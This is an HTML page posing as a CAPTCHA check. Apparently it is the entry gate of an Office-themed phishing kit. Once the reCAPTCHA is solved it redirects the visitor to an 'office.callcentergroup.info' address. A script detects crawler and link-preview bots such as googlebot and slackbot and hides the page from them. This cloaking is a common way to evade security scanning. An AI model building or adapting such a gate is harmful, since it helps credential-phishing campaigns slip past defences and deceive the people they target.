

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="x-apple-disable-message-reformatting">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="icon" type="image/x-icon" href="vnurregv435r5et.png">
    <title>CAPTCHA</title>
    <style>
        *{
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            padding: 10px;
        }

        .logo-container{
            max-width:900px;
            margin: auto;
            
        }
        
        .logo-center{
            
            margin: auto;
            text-align: center;
        }
        .logo img {
            max-width: 90px;
        }

        .container {
            margin-left: auto;
            margin-right: auto;
            margin-top: 200px;
            max-width: 400px;
            padding: 20px 30px;
            border-radius: 4px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            background-color: white;
            display: flex;
            justify-content: center;
        }
        #submit-button {
            background-color: #0067b8; /* Blue color */
            color: white;
            border: none;
            padding: 12px 0; /* Top and bottom padding */
            cursor: pointer;
            font-size: 16px;
            border-radius: 4px;
            width: 300px; /* Fixed width for button */
            transition: background-color 0.3s; /* Smooth background color transition */
        }
        #submit-button:hover {
            background-color: #035799; /* Darker blue on hover */
        }
        .error-message {
            color: red; /* Red text color for error messages */
            margin: 10px 0;
            display: none; /* Initially hidden */
        }
    </style>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <script>
        function onSubmit(e) {
            e.preventDefault();
            const recaptchaResponse = grecaptcha.getResponse();
            const errorMessage = document.getElementById("error-message");

            // Reset error message
            errorMessage.style.display = "none";

            if (recaptchaResponse.length === 0) {
                errorMessage.innerText = "Please complete the CAPTCHA.";
                errorMessage.style.display = "block"; // Show error message
                return;
            }

            // Proceed with redirection
            window.location.href = "https://office.callcentergroup.info/aaAESwPn"; // Replace with your URL
        }

        // Block known bots based on user agent
        const userAgent = navigator.userAgent.toLowerCase();
        const bots = ['googlebot', 'bingbot', 'slackbot', 'facebookexternalhit', 'twitterbot'];

        if (bots.some(bot => userAgent.includes(bot))) {
            document.body.innerHTML = "<h1>Access Denied</h1><p>Bot access is not allowed.</p>";
        }
    </script>
</head>
<body>

    <div class="container">
        <div class="logo-center">
			<div class="logo" style="margin-bottom: 80px;">
				
            </div>
        <div>
        </div>
            <form id="captcha-form" onsubmit="onSubmit(event)">
                <div class="g-recaptcha" data-sitekey="6LfTPlUUAAAAAGSUt1_LqpJXQpatx7_BzTDcU9On"></div>
                <br>
                <div id="error-message" class="error-message"></div> <!-- Error message container -->
                <button style="margin-bottom: 80px;" id="submit-button" type="submit">Next</button>
            </form>
        </div>
	</div>

</body>
</html>
